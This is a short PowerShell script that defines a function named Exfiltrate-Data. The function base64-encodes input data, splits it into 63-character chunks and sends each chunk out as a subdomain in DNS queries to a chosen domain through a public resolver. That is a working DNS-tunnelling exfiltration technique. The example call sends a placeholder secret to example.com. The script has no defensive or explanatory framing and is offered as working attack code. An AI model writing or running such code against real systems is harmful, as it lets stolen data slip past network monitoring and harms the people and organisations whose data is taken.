function Exfiltrate-Data {
    param (
        [string]$data,
        [string]$domain
    )
    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
    $chunks = $encodedData -split '(.{63})' | Where-Object { $_ }
    foreach ($chunk in $chunks) {
        $query = "$chunk.$domain"
        Resolve-DnsName -Name $query -Type A -Server 8.8.8.8
    }
}

$data = "This is a secret message"
$domain = "example.com"
Exfiltrate-Data -data $data -domain $domain
